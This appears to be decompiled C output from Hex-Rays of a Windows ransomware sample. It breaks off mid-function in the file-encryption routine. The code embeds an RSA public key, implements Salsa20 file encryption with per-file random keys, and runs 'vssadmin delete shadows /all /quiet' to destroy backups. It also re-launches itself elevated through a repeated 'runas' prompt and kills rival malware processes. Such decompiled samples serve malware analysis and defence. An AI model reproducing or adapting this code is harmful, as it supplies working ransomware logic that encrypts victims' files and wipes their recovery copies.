/* This file was generated by the Hex-Rays decompiler version 8.3.0.230608.
   Copyright (c) 2007-2021 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

// _BYTE *__usercall sub_4016C8@<eax>(int a1@<eax>, _DWORD *a2);
// _BYTE *__usercall sub_4017BC@<eax>(int a1@<eax>, int a2@<ecx>);
HCRYPTKEY sub_40189E();
_DWORD *sub_4018EB();
int __cdecl sub_4019D2(int *a1, int a2);
// unsigned int __usercall sub_401BD4@<eax>(unsigned __int8 *a1@<eax>, int a2, int a3, int a4);
// LPVOID __usercall sub_401DFE@<eax>(int a1@<eax>);
void __cdecl sub_401E12(LPVOID lpMem);
BOOL sub_401E2F();
BOOL sub_401E9F();
HANDLE sub_401F9E();
void __cdecl sub_40204A(LPCWSTR lpFileName);
void __cdecl sub_4022A5(int a1);
int __cdecl sub_402448(LPNETRESOURCEW lpNetResource); // idb
void sub_4024E4();
void __noreturn start(); // weak

//-------------------------------------------------------------------------
// Data declarations

// extern BOOL (__stdcall *CryptReleaseContext)(HCRYPTPROV hProv, DWORD dwFlags);
// extern BOOL (__stdcall *GetTokenInformation)(HANDLE TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass, LPVOID TokenInformation, DWORD TokenInformationLength, PDWORD ReturnLength);
// extern PUCHAR (__stdcall *GetSidSubAuthorityCount)(PSID pSid);
// extern PDWORD (__stdcall *GetSidSubAuthority)(PSID pSid, DWORD nSubAuthority);
// extern BOOL (__stdcall *OpenProcessToken)(HANDLE ProcessHandle, DWORD DesiredAccess, PHANDLE TokenHandle);
// extern BOOL (__stdcall *CryptDestroyKey)(HCRYPTKEY hKey);
// extern BOOL (__stdcall *CryptAcquireContextA)(HCRYPTPROV *phProv, LPCSTR szContainer, LPCSTR szProvider, DWORD dwProvType, DWORD dwFlags);
// extern BOOL (__stdcall *CryptExportKey)(HCRYPTKEY hKey, HCRYPTKEY hExpKey, DWORD dwBlobType, DWORD dwFlags, BYTE *pbData, DWORD *pdwDataLen);
// extern BOOL (__stdcall *CryptGenRandom)(HCRYPTPROV hProv, DWORD dwLen, BYTE *pbBuffer);
// extern BOOL (__stdcall *CryptEncrypt)(HCRYPTKEY hKey, HCRYPTHASH hHash, BOOL Final, DWORD dwFlags, BYTE *pbData, DWORD *pdwDataLen, DWORD dwBufLen);
// extern BOOL (__stdcall *CryptGenKey)(HCRYPTPROV hProv, ALG_ID Algid, DWORD dwFlags, HCRYPTKEY *phKey);
// extern BOOL (__stdcall *CryptImportKey)(HCRYPTPROV hProv, const BYTE *pbData, DWORD dwDataLen, HCRYPTKEY hPubKey, DWORD dwFlags, HCRYPTKEY *phKey);
// extern BOOL (__stdcall *CreateProcessW)(LPCWSTR lpApplicationName, LPWSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCWSTR lpCurrentDirectory, LPSTARTUPINFOW lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);
// extern BOOL (__stdcall *SetFilePointerEx)(HANDLE hFile, LARGE_INTEGER liDistanceToMove, PLARGE_INTEGER lpNewFilePointer, DWORD dwMoveMethod);
// extern DWORD (__stdcall *GetLogicalDrives)();
// extern BOOL (__stdcall *WriteFile)(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
// extern HANDLE (__stdcall *OpenProcess)(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);
// extern BOOL (__stdcall *TerminateProcess)(HANDLE hProcess, UINT uExitCode);
// extern HANDLE (__stdcall *FindFirstFileW)(LPCWSTR lpFileName, LPWIN32_FIND_DATAW lpFindFileData);
// extern DWORD (__stdcall *GetModuleFileNameW)(HMODULE hModule, LPWSTR lpFilename, DWORD nSize);
// extern HANDLE (__stdcall *CreateFileW)(LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
// extern int (__stdcall *lstrcmpW)(LPCWSTR lpString1, LPCWSTR lpString2);
// extern int (__stdcall *lstrlenW)(LPCWSTR lpString);
// extern DWORD (__stdcall *GetLastError)();
// extern void (__stdcall __noreturn *ExitProcess)(UINT uExitCode);
// extern BOOL (__stdcall *FindClose)(HANDLE hFindFile);
// extern BOOL (__stdcall *Process32NextW)(HANDLE hSnapshot, LPPROCESSENTRY32W lppe);
// extern int (__stdcall *lstrcmpiW)(LPCWSTR lpString1, LPCWSTR lpString2);
// extern BOOL (__stdcall *FindNextFileW)(HANDLE hFindFile, LPWIN32_FIND_DATAW lpFindFileData);
// extern HANDLE (__stdcall *CreateToolhelp32Snapshot)(DWORD dwFlags, DWORD th32ProcessID);
// extern BOOL (__stdcall *CloseHandle)(HANDLE hObject);
// extern LPWSTR (__stdcall *lstrcpyW)(LPWSTR lpString1, LPCWSTR lpString2);
// extern HANDLE (__stdcall *GetProcessHeap)();
// extern BOOL (__stdcall *HeapFree)(HANDLE hHeap, DWORD dwFlags, LPVOID lpMem);
// extern LPVOID (__stdcall *HeapAlloc)(HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);
// extern int (__stdcall *lstrlenA)(LPCSTR lpString);
// extern BOOL (__stdcall *ReadFile)(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped);
// extern BOOL (__stdcall *MoveFileW)(LPCWSTR lpExistingFileName, LPCWSTR lpNewFileName);
// extern _UNKNOWN byte_40109C; weak
// extern DWORD (__stdcall *WNetEnumResourceW)(HANDLE hEnum, LPDWORD lpcCount, LPVOID lpBuffer, LPDWORD lpBufferSize);
// extern DWORD (__stdcall *WNetOpenEnumW)(DWORD dwScope, DWORD dwType, DWORD dwUsage, LPNETRESOURCEW lpNetResource, LPHANDLE lphEnum);
// extern DWORD (__stdcall *WNetCloseEnum)(HANDLE hEnum);
// extern HINSTANCE (__stdcall *ShellExecuteW)(HWND hwnd, LPCWSTR lpOperation, LPCWSTR lpFile, LPCWSTR lpParameters, LPCWSTR lpDirectory, INT nShowCmd);
// extern PWSTR (__stdcall *StrStrW)(PCWSTR pszFirst, PCWSTR pszSrch);
// extern int (*wnsprintfW)(PWSTR pszDest, int cchDest, PCWSTR pszFmt, ...);
char BASE64_table_401120[] = { 'A' }; // weak
const CHAR String[] = "BgIAAACkAABSU0ExABAAAAEAAQAfUDvrYL7lF1XhXKge33OTLQA33gYy0ZDOhsWwBJW0B8cSFWvgrgQmosvTFpr4r8AM3zW8414cOdDLL91XnEUOXADx/fwMxGj0Lp+gxl/qg3kKzBSAoqSA+nqyvZtgpjCyQIDIu1FSUWPSkWz8QusTTWl7k5hbf49hgnZUYRDlM+H/YQ89U4gA9oCrqzfpk7dnRjcVGvQbqZeqCLF8PkT5sTXX8uNdXAjXAMqTVcypFHuJP1SFTmjku7nYX0WS6gseq1IynsjDVLY+XEu9JJ8qt5WvYR/Vsm0Q54TuzUcqiLOZdqvR/jntTD9OAbtIk88fjh5Am0wLNXWlMqsN0TbzPSPkDZCR00iCi3uIXblUFRaTuLsj3aAlJmixgXqqYGidWTNUoXGPSDXeM9CdwKL4tF6+B3oT0zYe4xMxuW+LubuQCWh7I2I4KlqaPDBKBtYLhStq2yvW653jn2fx84pCRM+VPuqbIdyo0lOz3W4C35xRKNbQW7XPDDL9b/yU+LhIX4BCZE19Y8u6rf8bJlqwUsIJNjSEHg0KsIQg4W1qrt7uhJCtMX1+dqDCaimWuYM/hguQ7J51LDeeOei/RhvYLe4L2cn9hQ1FQTc1VcReoRBhdU1hRKQQZEesndxPdOsYje1UhuP+qy/RyP958PdtPs7u5ttzWNckR4pgN3uTnQ=="; // idb
char salsa20_403000 = 'e'; // weak
char byte_403001 = 'x'; // weak
char byte_403002 = 'p'; // weak
char byte_403003 = 'a'; // weak
char byte_403004 = 'n'; // weak
char byte_403005 = 'd'; // weak
char byte_403006 = ' '; // weak
char byte_403007 = '3'; // weak
char byte_403008 = '2'; // weak
char byte_403009 = '-'; // weak
char byte_40300A = 'b'; // weak
char byte_40300B = 'y'; // weak
char byte_40300C = 't'; // weak
char byte_40300D = 'e'; // weak
char byte_40300E = ' '; // weak
char byte_40300F = 'k'; // weak
wchar_t *off_403018[2] = { L"rarog.exe", L"arkei.exe" }; // weak
wchar_t *off_403024[6] =
{
  L"Windows",
  L"Program Files",
  L"Program Files (x86)",
  L"$Recycle.bin",
  L"System Volume Information",
  L".txt"
}; // weak
wchar_t *off_403038 = L".txt"; // weak
LPCSTR lpBuffer = NULL; // idb
HCRYPTPROV hProv = 0u; // idb
HCRYPTKEY phKey = 0u; // idb


//----- (004016C8) --------------------------------------------------------
_BYTE *__usercall sub_4016C8@<eax>(int a1@<eax>, _DWORD *a2)
{
  const CHAR *v3; // eax
  _BYTE *v4; // esi
  int v5; // edi
  int i; // edx
  char v7; // cl
  unsigned __int8 v8; // cl
  int j; // ecx
  _BYTE *v11; // [esp+4h] [ebp-10h]
  char v12; // [esp+8h] [ebp-Ch]
  unsigned __int8 v13; // [esp+9h] [ebp-Bh]
  unsigned __int8 v14; // [esp+Ah] [ebp-Ah]
  char v15; // [esp+Bh] [ebp-9h]
  const CHAR *v16; // [esp+Ch] [ebp-8h]
  char v17[4]; // [esp+10h] [ebp-4h]

  v11 = sub_401DFE(a1 + 1);
  if ( v11 )
  {
    v3 = &String[a1];
    v4 = v11;
    v16 = "BgIAAACkAABSU0ExABAAAAEAAQAfUDvrYL7lF1XhXKge33OTLQA33gYy0ZDOhsWwBJW0B8cSFWvgrgQmosvTFpr4r8AM3zW8414cOdDLL91XnE"
          "UOXADx/fwMxGj0Lp+gxl/qg3kKzBSAoqSA+nqyvZtgpjCyQIDIu1FSUWPSkWz8QusTTWl7k5hbf49hgnZUYRDlM+H/YQ89U4gA9oCrqzfpk7dn"
          "RjcVGvQbqZeqCLF8PkT5sTXX8uNdXAjXAMqTVcypFHuJP1SFTmjku7nYX0WS6gseq1IynsjDVLY+XEu9JJ8qt5WvYR/Vsm0Q54TuzUcqiLOZdq"
          "vR/jntTD9OAbtIk88fjh5Am0wLNXWlMqsN0TbzPSPkDZCR00iCi3uIXblUFRaTuLsj3aAlJmixgXqqYGidWTNUoXGPSDXeM9CdwKL4tF6+B3oT"
          "0zYe4xMxuW+LubuQCWh7I2I4KlqaPDBKBtYLhStq2yvW653jn2fx84pCRM+VPuqbIdyo0lOz3W4C35xRKNbQW7XPDDL9b/yU+LhIX4BCZE19Y8"
          "u6rf8bJlqwUsIJNjSEHg0KsIQg4W1qrt7uhJCtMX1+dqDCaimWuYM/hguQ7J51LDeeOei/RhvYLe4L2cn9hQ1FQTc1VcReoRBhdU1hRKQQZEes"
          "ndxPdOsYje1UhuP+qy/RyP958PdtPs7u5ttzWNckR4pgN3uTnQ==";
    while ( v16 < v3 )
    {
      v5 = 0;
      for ( i = 0; i < 4; ++i )
      {
        if ( v16 >= v3 )
          break;
        v7 = 0;
        while ( !v7 )
        {
          v8 = *v16++;
          if ( (unsigned __int8)(v8 - 43) > 0x4Fu )
            v7 = 0;
          else
            v7 = *((_BYTE *)&byte_40109C + v8 + 1);
          if ( v7 )
            v7 = (v7 - 61) & ((v7 == 36) - 1);
          if ( v16 >= v3 )
          {
            if ( !v7 )
              goto LABEL_15;
            break;
          }
        }
        ++v5;
        *(&v12 + i) = v7 - 1;
LABEL_15:
        ;
      }
      if ( v5 )
      {
        v17[0] = (4 * v12) | (v13 >> 4);
        v17[1] = (16 * v13) | (v14 >> 2);
        v17[2] = v15 | (v14 << 6);
        for ( j = 0; j < v5 - 1; ++j )
          *v4++ = v17[j];
      }
    }
    *v4 = 0;
    if ( a2 )
      *a2 = v4 - v11;
  }
  return v11;
}

//----- (004017BC) --------------------------------------------------------
_BYTE *__usercall sub_4017BC@<eax>(int a1@<eax>, int a2@<ecx>)
{
  int v2; // ebx
  _BYTE *v4; // esi
  unsigned int v5; // edi
  unsigned int i; // edx
  char v7; // cl
  unsigned int v8; // edx
  char v9; // cl
  char v10; // cl
  _BYTE *v12; // [esp+Ch] [ebp-Ch]
  int v13; // [esp+10h] [ebp-8h]
  char v14[2]; // [esp+14h] [ebp-4h] BYREF
  unsigned __int8 v15; // [esp+16h] [ebp-2h]

  v2 = a1;
  v4 = sub_401DFE(4 * ((a1 + 2) / 3u) + 1);
  v12 = v4;
  if ( v4 )
  {
    if ( v2 )
    {
      v13 = a2 - (_DWORD)v14;
      do
      {
        v5 = 0;
        for ( i = 0; i < 3; ++i )
        {
          if ( v2 )
          {
            --v2;
            ++v5;
            v14[i] = v14[i + v13];
          }
          else
          {
            v14[i] = 0;
          }
        }
        v7 = v14[0];
        v8 = (unsigned __int8)v14[1];
        v13 += 3;
        *v4 = BASE64_table_401120[(unsigned __int8)v14[0] >> 2];
        v4[1] = BASE64_table_401120[(16 * (v7 & 3)) | (v8 >> 4)];
        if ( v5 <= 1 )
          v9 = 61;
        else
          v9 = BASE64_table_401120[(4 * (v8 & 0xF)) | (v15 >> 6)];
        v4[2] = v9;
        if ( v5 <= 2 )
          v10 = 61;
        else
          v10 = BASE64_table_401120[v15 & 0x3F];
        v4[3] = v10;
        v4 += 4;
      }
      while ( v2 );
    }
    *v4 = 0;
  }
  return v12;
}

//----- (0040189E) --------------------------------------------------------
HCRYPTKEY sub_40189E()
{
  HCRYPTPROV v0; // esi
  int v1; // eax
  BYTE *v2; // edi
  DWORD dwDataLen; // [esp+8h] [ebp-8h] BYREF
  HCRYPTKEY phKey; // [esp+Ch] [ebp-4h] BYREF

  phKey = 0;
  v0 = hProv;
  v1 = lstrlenA(
         "BgIAAACkAABSU0ExABAAAAEAAQAfUDvrYL7lF1XhXKge33OTLQA33gYy0ZDOhsWwBJW0B8cSFWvgrgQmosvTFpr4r8AM3zW8414cOdDLL91XnEU"
         "OXADx/fwMxGj0Lp+gxl/qg3kKzBSAoqSA+nqyvZtgpjCyQIDIu1FSUWPSkWz8QusTTWl7k5hbf49hgnZUYRDlM+H/YQ89U4gA9oCrqzfpk7dnRj"
         "cVGvQbqZeqCLF8PkT5sTXX8uNdXAjXAMqTVcypFHuJP1SFTmjku7nYX0WS6gseq1IynsjDVLY+XEu9JJ8qt5WvYR/Vsm0Q54TuzUcqiLOZdqvR/"
         "jntTD9OAbtIk88fjh5Am0wLNXWlMqsN0TbzPSPkDZCR00iCi3uIXblUFRaTuLsj3aAlJmixgXqqYGidWTNUoXGPSDXeM9CdwKL4tF6+B3oT0zYe"
         "4xMxuW+LubuQCWh7I2I4KlqaPDBKBtYLhStq2yvW653jn2fx84pCRM+VPuqbIdyo0lOz3W4C35xRKNbQW7XPDDL9b/yU+LhIX4BCZE19Y8u6rf8"
         "bJlqwUsIJNjSEHg0KsIQg4W1qrt7uhJCtMX1+dqDCaimWuYM/hguQ7J51LDeeOei/RhvYLe4L2cn9hQ1FQTc1VcReoRBhdU1hRKQQZEesndxPdO"
         "sYje1UhuP+qy/RyP958PdtPs7u5ttzWNckR4pgN3uTnQ==");
  v2 = sub_4016C8(v1, &dwDataLen);
  if ( v2 )
  {
    CryptImportKey(v0, v2, dwDataLen, 0, 0, &phKey);
    sub_401E12(v2);
  }
  return phKey;
}

//----- (004018EB) --------------------------------------------------------
_DWORD *sub_4018EB()
{
  _DWORD *v0; // esi
  BYTE *v1; // eax
  int v2; // eax
  _BYTE *v3; // eax
  DWORD v4; // edx
  BYTE *v5; // ecx
  int v6; // eax
  _BYTE *v7; // eax
  DWORD v8; // edi
  BYTE *v9; // ecx
  DWORD v11; // [esp+4h] [ebp-10h]
  HCRYPTKEY phKey; // [esp+8h] [ebp-Ch] BYREF
  BYTE *pbData; // [esp+Ch] [ebp-8h]
  DWORD pdwDataLen; // [esp+10h] [ebp-4h] BYREF

  v0 = 0;
  if ( CryptGenKey(hProv, 0xA400u, 0x1800001u, &phKey) )
  {
    v0 = sub_401DFE(8);
    v1 = (BYTE *)sub_401DFE(384);
    pbData = v1;
    if ( v1 )
    {
      pdwDataLen = 384;
      if ( CryptExportKey(phKey, 0, 6u, 0, v1, &pdwDataLen) )
      {
        v2 = pdwDataLen;
        v0[2] = pdwDataLen;
        v3 = sub_401DFE(v2);
        v4 = pdwDataLen;
        *v0 = v3;
        if ( v4 )
        {
          v5 = (BYTE *)(pbData - v3);
          v11 = v4;
          do
          {
            *v3 = v3[(_DWORD)v5];
            ++v3;
            --v11;
          }
          while ( v11 );
        }
      }
      pdwDataLen = 384;
      if ( CryptExportKey(phKey, 0, 7u, 0, pbData, &pdwDataLen) )
      {
        v6 = pdwDataLen;
        v0[3] = pdwDataLen;
        v7 = sub_401DFE(v6);
        v8 = pdwDataLen;
        v0[1] = v7;
        if ( v8 )
        {
          v9 = (BYTE *)(pbData - v7);
          do
          {
            *v7 = v7[(_DWORD)v9];
            ++v7;
            --v8;
          }
          while ( v8 );
        }
      }
      sub_401E12(pbData);
    }
    CryptDestroyKey(phKey);
  }
  return v0;
}

//----- (004019D2) --------------------------------------------------------
int __cdecl sub_4019D2(int *a1, int a2)
{
  int i; // ecx
  int v3; // eax
  int v4; // edx
  int v5; // edx
  int v6; // ecx
  int v7; // eax
  int v8; // esi
  int v9; // eax
  int v10; // ecx
  int v11; // edx
  int v12; // esi
  int *v13; // ecx
  int v14; // edi
  int result; // eax
  int v16; // [esp+0h] [ebp-44h]
  int v17; // [esp+4h] [ebp-40h]
  int v18; // [esp+8h] [ebp-3Ch]
  int v19; // [esp+Ch] [ebp-38h]
  int v20; // [esp+10h] [ebp-34h]
  int v21; // [esp+14h] [ebp-30h]
  int v22; // [esp+18h] [ebp-2Ch]
  int v23; // [esp+1Ch] [ebp-28h]
  int v24; // [esp+20h] [ebp-24h]
  int v25; // [esp+24h] [ebp-20h]
  int v26; // [esp+28h] [ebp-1Ch]
  int v27; // [esp+2Ch] [ebp-18h]
  int v28; // [esp+30h] [ebp-14h]
  int v29; // [esp+34h] [ebp-10h]
  int v30; // [esp+38h] [ebp-Ch]
  int v31; // [esp+3Ch] [ebp-8h]
  int v32; // [esp+40h] [ebp-4h]

  for ( i = 0; i < 16; ++i )
  {
    v3 = i % 4 + 4 * (i / 4);
    v4 = *(_DWORD *)(a2 + 4 * i);
    *(&v16 + v3) = v4;
  }
  v5 = v28;
  v6 = v24;
  v7 = v20;
  v8 = v16;
  v32 = 10;
  do
  {
    v9 = __ROL4__(v8 + v5, 7) ^ v7;
    v10 = __ROL4__(v9 + v8, 9) ^ v6;
    v11 = __ROL4__(v10 + v9, 13) ^ v5;
    v12 = __ROR4__(v10 + v11, 14) ^ v8;
    v25 ^= __ROL4__(v17 + v21, 7);
    v29 ^= __ROL4__(v21 + v25, 9);
    v17 ^= __ROL4__(v25 + v29, 13);
    v21 ^= __ROR4__(v17 + v29, 14);
    v30 ^= __ROL4__(v22 + v26, 7);
    v18 ^= __ROL4__(v26 + v30, 9);
    v22 ^= __ROL4__(v30 + v18, 13);
    v26 ^= __ROR4__(v22 + v18, 14);
    v19 ^= __ROL4__(v27 + v31, 7);
    v23 ^= __ROL4__(v31 + v19, 9);
    v27 ^= __ROL4__(v19 + v23, 13);
    v31 ^= __ROR4__(v27 + v23, 14);
    v17 ^= __ROL4__(v12 + v19, 7);
    v18 ^= __ROL4__(v12 + v17, 9);
    v19 ^= __ROL4__(v17 + v18, 13);
    v8 = __ROR4__(v18 + v19, 14) ^ v12;
    v22 ^= __ROL4__(v9 + v21, 7);
    v23 ^= __ROL4__(v21 + v22, 9);
    v7 = __ROL4__(v22 + v23, 13) ^ v9;
    v21 ^= __ROR4__(v7 + v23, 14);
    v27 ^= __ROL4__(v25 + v26, 7);
    v6 = __ROL4__(v26 + v27, 9) ^ v10;
    v25 ^= __ROL4__(v6 + v27, 13);
    v26 ^= __ROR4__(v6 + v25, 14);
    v5 = __ROL4__(v30 + v31, 7) ^ v11;
    v29 ^= __ROL4__(v5 + v31, 9);
    v30 ^= __ROL4__(v5 + v29, 13);
    v31 ^= __ROR4__(v29 + v30, 14);
    --v32;
  }
  while ( v32 );
  v16 = v8;
  v24 = v6;
  v13 = a1;
  v14 = 0;
  v28 = v5;
  v20 = v7;
  do
  {
    result = *(int *)((char *)v13 + a2 - (_DWORD)a1) + *(&v16 + 4 * (v14 / 4) + v14 % 4);
    ++v14;
    *v13++ = result;
  }
  while ( v14 < 16 );
  return result;
}

//----- (00401BD4) --------------------------------------------------------
unsigned int __usercall sub_401BD4@<eax>(unsigned __int8 *a1@<eax>, int a2, int a3, int a4)
{
  int v4; // edx
  int v5; // ecx
  int v6; // edx
  int v7; // esi
  int v8; // edx
  int v9; // ecx
  int v10; // edx
  int v11; // ecx
  int v12; // edx
  int v13; // ecx
  int v14; // edx
  unsigned int result; // eax
  int v16[16]; // [esp+4h] [ebp-80h] BYREF
  int v17[16]; // [esp+44h] [ebp-40h] BYREF

  v17[0] = salsa20_403000 | ((byte_403001 | ((byte_403002 | (byte_403003 << 8)) << 8)) << 8);
  v17[1] = *a1 | ((a1[1] | (*((unsigned __int16 *)a1 + 1) << 8)) << 8);
  v4 = a1[10];
  v17[2] = a1[4] | ((a1[5] | (*((unsigned __int16 *)a1 + 3) << 8)) << 8);
  v5 = a1[8] | ((a1[9] | ((v4 | (a1[11] << 8)) << 8)) << 8);
  v6 = a1[14];
  v17[3] = v5;
  v17[4] = a1[12] | ((a1[13] | ((v6 | (a1[15] << 8)) << 8)) << 8);
  v17[5] = byte_403004 | ((byte_403005 | ((byte_403006 | (byte_403007 << 8)) << 8)) << 8);
  v17[8] = a3;
  v17[9] = a4;
  v7 = 0;
  v17[6] = -559038242;
  v17[7] = 0;
  v8 = a1[18];
  v17[10] = byte_403008 | ((byte_403009 | ((byte_40300A | (byte_40300B << 8)) << 8)) << 8);
  v9 = a1[16] | ((a1[17] | ((v8 | (a1[19] << 8)) << 8)) << 8);
  v10 = a1[22];
  v17[11] = v9;
  v11 = a1[20] | ((a1[21] | ((v10 | (a1[23] << 8)) << 8)) << 8);
  v12 = a1[26];
  v17[12] = v11;
  v13 = a1[24] | ((a1[25] | ((v12 | (a1[27] << 8)) << 8)) << 8);
  v14 = a1[30];
  v17[13] = v13;
  v17[14] = a1[28] | ((a1[29] | ((v14 | (a1[31] << 8)) << 8)) << 8);
  v17[15] = byte_40300C | ((byte_40300D | ((byte_40300E | (byte_40300F << 8)) << 8)) << 8);
  sub_4019D2(v16, (int)v17);
  do
  {
    result = (unsigned int)v16[v7 / 4] >> (8 * (v7 % 4));
    *(_BYTE *)(v7 + a2) = result;
    ++v7;
  }
  while ( v7 < 64 );
  return result;
}
// 403000: using guessed type char salsa20_403000;
// 403001: using guessed type char byte_403001;
// 403002: using guessed type char byte_403002;
// 403003: using guessed type char byte_403003;
// 403004: using guessed type char byte_403004;
// 403005: using guessed type char byte_403005;
// 403006: using guessed type char byte_403006;
// 403007: using guessed type char byte_403007;
// 403008: using guessed type char byte_403008;
// 403009: using guessed type char byte_403009;
// 40300A: using guessed type char byte_40300A;
// 40300B: using guessed type char byte_40300B;
// 40300C: using guessed type char byte_40300C;
// 40300D: using guessed type char byte_40300D;
// 40300E: using guessed type char byte_40300E;
// 40300F: using guessed type char byte_40300F;
// 401BD4: using guessed type int var_80[16];

//----- (00401DFE) --------------------------------------------------------
LPVOID __usercall sub_401DFE@<eax>(int a1@<eax>)
{
  HANDLE ProcessHeap; // eax
  SIZE_T v3; // [esp-4h] [ebp-4h]

  v3 = a1 + 64;
  ProcessHeap = GetProcessHeap();
  return HeapAlloc(ProcessHeap, 8u, v3);
}

//----- (00401E12) --------------------------------------------------------
void __cdecl sub_401E12(LPVOID lpMem)
{
  HANDLE ProcessHeap; // eax

  if ( lpMem )
  {
    ProcessHeap = GetProcessHeap();
    HeapFree(ProcessHeap, 0, lpMem);
  }
}

//----- (00401E2F) --------------------------------------------------------
BOOL sub_401E2F()
{
  unsigned int i; // eax
  BOOL result; // eax
  WCHAR String1[260]; // [esp+0h] [ebp-25Ch] BYREF
  struct _STARTUPINFOW StartupInfo; // [esp+208h] [ebp-54h] BYREF
  struct _PROCESS_INFORMATION ProcessInformation; // [esp+24Ch] [ebp-10h] BYREF

  lstrcpyW(String1, L" delete shadows /all /quiet");
  for ( i = 0; i < 0x44; ++i )
  {
    *((_BYTE *)&StartupInfo.cb + i) = 0;
    if ( !i )
      i = 0;
  }
  StartupInfo.cb = 68;
  result = CreateProcessW(
             L"C:\\Windows\\sysnative\\vssadmin.exe",
             String1,
             0,
             0,
             0,
             0x8000000u,
             0,
             0,
             &StartupInfo,
             &ProcessInformation);
  if ( result )
  {
    CloseHandle(ProcessInformation.hThread);
    return CloseHandle(ProcessInformation.hProcess);
  }
  return result;
}

//----- (00401E9F) --------------------------------------------------------
BOOL sub_401E9F()
{
  BOOL result; // eax
  PSID *v1; // edi
  PUCHAR SidSubAuthorityCount; // eax
  WCHAR *v3; // eax
  WCHAR *v4; // esi
  HANDLE TokenHandle; // [esp+4h] [ebp-Ch] BYREF
  DWORD ReturnLength; // [esp+8h] [ebp-8h] BYREF
  char v7; // [esp+Fh] [ebp-1h]

  v7 = 0;
  result = OpenProcessToken((HANDLE)0xFFFFFFFF, 8u, &TokenHandle);
  if ( result )
  {
    if ( !GetTokenInformation(TokenHandle, TokenIntegrityLevel, 0, 0, &ReturnLength) && GetLastError() == 122 )
    {
      v1 = (PSID *)sub_401DFE(ReturnLength);
      if ( v1 )
      {
        if ( GetTokenInformation(TokenHandle, TokenIntegrityLevel, v1, ReturnLength, &ReturnLength) )
        {
          SidSubAuthorityCount = GetSidSubAuthorityCount(*v1);
          if ( *GetSidSubAuthority(*v1, *SidSubAuthorityCount - 1) == 4096 )
          {
            v7 = 1;
            v3 = (WCHAR *)sub_401DFE(65534);
            v4 = v3;
            if ( v3 )
            {
              if ( GetModuleFileNameW(0, v3, 0x7FFFu) )
              {
                while ( !ShellExecuteW(0, L"runas", v4, 0, 0, 1) && GetLastError() == 1223 )
                  ;
              }
              sub_401E12(v4);
            }
          }
        }
        sub_401E12(v1);
      }
    }
    result = CloseHandle(TokenHandle);
    if ( v7 )
      ExitProcess(0);
  }
  return result;
}

//----- (00401F9E) --------------------------------------------------------
HANDLE sub_401F9E()
{
  HANDLE result; // eax
  HANDLE v1; // eax
  void *v2; // esi
  PROCESSENTRY32W pe; // [esp+0h] [ebp-234h] BYREF
  HANDLE hSnapshot; // [esp+22Ch] [ebp-8h]
  unsigned int i; // [esp+230h] [ebp-4h]

  result = CreateToolhelp32Snapshot(2u, 0);
  hSnapshot = result;
  if ( result != (HANDLE)-1 )
  {
    pe.dwSize = 556;
    while ( Process32NextW(hSnapshot, &pe) )
    {
      for ( i = 0; i < 8; i += 4 )
      {
        if ( !lstrcmpW(pe.szExeFile, off_403018[i / 4]) )
        {
          v1 = OpenProcess(1u, 0, pe.th32ProcessID);
          v2 = v1;
          if ( v1 != (HANDLE)-1 )
          {
            TerminateProcess(v1, 0);
            CloseHandle(v2);
          }
        }
      }
    }
    return (HANDLE)CloseHandle(hSnapshot);
  }
  return result;
}
// 403018: using guessed type wchar_t *off_403018[2];

//----- (0040204A) --------------------------------------------------------
void __cdecl sub_40204A(LPCWSTR lpFileName)
{
  int v1; // edi
  void *v2; // eax
  _BYTE *v3; // esi
  const WCHAR *v4; // eax
  const WCHAR *v5; // eax
  void *v6; // eax
  LPVOID v7; // eax
  int v8; // ecx
  WCHAR *v9; // eax
  WCHAR *v10; // esi
  const WCHAR *v11; // [esp-4h] [ebp-A8h]
  char v12[68]; // [esp+10h] [ebp-94h] BYREF
  BYTE pbBuffer[32]; // [esp+54h] [ebp-50h] BYREF
  DWORD v14; // [esp+74h] [ebp-30h]
  DWORD pdwDataLen; // [esp+7Ch] [ebp-28h] BYREF
  int v16; // [esp+80h] [ebp-24h]
  int Buffer; // [esp+84h] [ebp-20h] BYREF
  int v18; // [esp+88h] [ebp-1Ch]
  LPCVOID v19; // [esp+8Ch] [ebp-18h]
  LPVOID lpBuffer; // [esp+90h] [ebp-14h]
  DWORD NumberOfBytesRead; // [esp+94h] [ebp-10h] BYREF
  HANDLE hFile; // [esp+98h] [ebp-Ch]
  int v23; // [esp+9Ch] [ebp-8h]

  v1 = 32;
  if ( CryptGenRandom(hProv, 0x20u, pbBuffer) )
  {
    v2 = sub_401DFE(48);
    v19 = v2;
    if ( v2 )
    {
      pdwDataLen = 32;
      v3 = v2;
      do
      {
        *v3 = v3[pbBuffer - (_BYTE *)v2];
        ++v3;
        --v1;
      }
      while ( v1 );
      CryptEncrypt(phKey, 0, 1, 0, (BYTE *)v2, &pdwDataLen, 0x30u);
      hFile = CreateFileW(lpFileName, 0xC0000000, 1u, 0, 3u, 0x80u, 0);
      if ( hFile != (HANDLE)-1 )
      {
        v18 = 0;
        v23 = 0;
        while ( 1 )
        {
          v4 = &lpFileName[lstrlenW(lpFileName)];
          do
            --v4;
          while ( *v4 != 92 );
          v5 = StrStrW(
                 &lpFileName[((char *)v4 - (char *)lpFileName + 2) >> 1],
                 *(wchar_t **)((char *)&off_403038 + v23));
          if ( v5 )
          {
            v6 = (void *)lstrlenW(v5);
            v11 = *(wchar_t **)((char *)&off_403038 + v23);
            lpBuffer = v6;
            v7 = (LPVOID)lstrlenW(v11);
            if ( lpBuffer == v7 )
              break;
          }
          v23 += 4;
          if ( (unsigned int)v23 >= 4 )
            goto LABEL_14;
        }
        v18 = 1;
LABEL_14:
